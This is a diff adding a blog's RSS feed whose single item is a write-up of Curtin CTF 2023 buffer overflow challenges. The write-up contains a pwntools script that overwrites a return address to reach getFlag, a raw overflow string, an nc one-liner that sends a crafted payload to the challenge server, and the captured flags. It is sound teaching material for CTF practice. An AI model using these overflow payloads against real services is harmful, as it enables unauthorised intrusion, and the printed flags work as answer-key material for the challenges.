@@ -1,0 +1,167 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Buffer Overflow on n3rr</title><link>https://n3rr.github.io/tags/buffer-overflow/</link><description>Recent content in Buffer Overflow on n3rr</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 16 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://n3rr.github.io/tags/buffer-overflow/index.xml" rel="self" type="application/rss+xml"/><item><title>Curtin CTF 2023</title><link>https://n3rr.github.io/p/curtinctf23/</link><pubDate>Wed, 16 Aug 2023 00:00:00 +0000</pubDate><guid>https://n3rr.github.io/p/curtinctf23/</guid><description>&lt;img src="https://n3rr.github.io/p/curtinctf23/curtinctf-poster.png" alt="Featured image of post Curtin CTF 2023" />&lt;h1 id="classic-bufferoverflow">Classic Bufferoverflow
+&lt;/h1>&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image.png"
+width="620"
+height="651"
+srcset="https://n3rr.github.io/p/curtinctf23/image_hu15649904971208548899.png 480w, https://n3rr.github.io/p/curtinctf23/image_hu18324956216252885061.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="95"
+data-flex-basis="228px"
+>&lt;/p>
+&lt;p>When running the program, it will show something like &lt;code>ltrace&lt;/code> or &lt;code>strace&lt;/code> command.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-1.png"
+width="653"
+height="187"
+srcset="https://n3rr.github.io/p/curtinctf23/image-1_hu5609767121101502779.png 480w, https://n3rr.github.io/p/curtinctf23/image-1_hu17459537640026064048.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="349"
+data-flex-basis="838px"
+>&lt;/p>
+&lt;p>First of all when facing a &lt;strong>buffer overflow&lt;/strong> challenge, find the offset which for this challenge is &lt;strong>40 bytes&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-2.png"
+width="658"
+height="127"
+srcset="https://n3rr.github.io/p/curtinctf23/image-2_hu14869934774013866297.png 480w, https://n3rr.github.io/p/curtinctf23/image-2_hu17950998143722683386.png 1024w"
+loading="lazy"
+alt="Notice that Better luck next time! did not printed in the image below means that we hit the offset value"
+class="gallery-image"
+data-flex-grow="518"
+data-flex-basis="1243px"
+>&lt;/p>
+&lt;p>Next, looking to the code using &lt;strong>gdb-gef&lt;/strong> and theres 3 functions, main, getFlag and getInput.&lt;/p>
+&lt;p>The target is the function &lt;strong>getFlag&lt;/strong>, obviously to give the flag. So, get the address of the function which is &lt;strong>0x00000000004011d6&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-3.png"
+width="376"
+height="362"
+srcset="https://n3rr.github.io/p/curtinctf23/image-3_hu3502151771535990753.png 480w, https://n3rr.github.io/p/curtinctf23/image-3_hu2010653621385135221.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="103"
+data-flex-basis="249px"
+>&lt;/p>
+&lt;p>The script to solve this challenge as below.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./challenge.bin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rem&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;3.26.44.175&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3336&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">offset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">addr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x004011d6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">offset&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">addr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rem&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rem&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-4.png"
+width="663"
+height="332"
+srcset="https://n3rr.github.io/p/curtinctf23/image-4_hu75331315910385580.png 480w, https://n3rr.github.io/p/curtinctf23/image-4_hu14717959558918385746.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="479px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> CURTIN_CTF{B4S1C_0V3RF10W}&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="intro-to-buffer-overflow">Intro to Buffer Overflow
+&lt;/h1>&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-5.png"
+width="622"
+height="618"
+srcset="https://n3rr.github.io/p/curtinctf23/image-5_hu16985170489597302309.png 480w, https://n3rr.github.io/p/curtinctf23/image-5_hu8724555072116400849.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="241px"
+>&lt;/p>
+&lt;p>Just a basic Buffer Overflow challenge.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-6.png"
+width="355"
+height="126"
+srcset="https://n3rr.github.io/p/curtinctf23/image-6_hu2107975961726559359.png 480w, https://n3rr.github.io/p/curtinctf23/image-6_hu5659995280279191407.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="281"
+data-flex-basis="676px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> CURTIN_CTF{Y0UR_F1R5T_0V3RFL0W}&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="dont-go-overboard">Don&amp;rsquo;t Go Overboard
+&lt;/h1>&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-7.png"
+width="617"
+height="670"
+srcset="https://n3rr.github.io/p/curtinctf23/image-7_hu17499103687834872543.png 480w, https://n3rr.github.io/p/curtinctf23/image-7_hu1366062398090557639.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="92"
+data-flex-basis="221px"
+>&lt;/p>
+&lt;p>For this challenge, you need to find the right offset so that it will overflow the buffer.&lt;/p>
+&lt;p>So, found it at 30 bytes but it still doesn&amp;rsquo;t give the flag&lt;/p>
+&lt;p>At line 16, the program checks the argument of &lt;code>0&lt;/code> and &lt;code>5&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-8.png"
+width="607"
+height="523"
+srcset="https://n3rr.github.io/p/curtinctf23/image-8_hu15368593858712695428.png 480w, https://n3rr.github.io/p/curtinctf23/image-8_hu3216960774319597265.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="116"
+data-flex-basis="278px"
+>&lt;/p>
+&lt;p>So, include &lt;code>05&lt;/code> in the payload, which is &lt;strong>30 bytes&lt;/strong> of the letter &lt;strong>a&lt;/strong>.&lt;/p>
+&lt;p>Like this &lt;code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa05&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> CURTIN_CTF{T@RG3TT3D_0V3RF10W}&lt;/p>
+&lt;/blockquote>
+&lt;h1 id="dont-go-overboard-2">Don&amp;rsquo;t Go Overboard 2
+&lt;/h1>&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-9.png"
+width="622"
+height="640"
+srcset="https://n3rr.github.io/p/curtinctf23/image-9_hu1304127185962247312.png 480w, https://n3rr.github.io/p/curtinctf23/image-9_hu15710589105999002765.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="97"
+data-flex-basis="233px"
+>&lt;/p>
+&lt;p>The challenge is similar to &lt;strong>Don’t Go Overboard&lt;/strong>. But this time, it checks the argument of address instead of decimal number.&lt;/p>
+&lt;p>Look at the main function. At line 16, it checks for address &lt;code>0xf&lt;/code> and &lt;code>0x405&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/curtinctf23/image-10.png"
+width="607"
+height="523"
+srcset="https://n3rr.github.io/p/curtinctf23/image-10_hu2823299380404166063.png 480w, https://n3rr.github.io/p/curtinctf23/image-10_hu7668135449244198526.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="116"
+data-flex-basis="278px"
+>&lt;/p>
+&lt;p>Put the address together with the payload and send it to the program like this.&lt;/p>
+&lt;p>&lt;code>python2 -c 'print &amp;quot;AAAAAAAAAAAAAAAAAAAAB\x00\x00\x00\x05\x04\x00\x00\x0f&amp;quot;' | nc 3.26.44.175 3335&lt;/code>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> CURTIN_CTF{P4YL04D_0V3RF10W}&lt;/p>
+&lt;/blockquote></description></item></channel></rss>
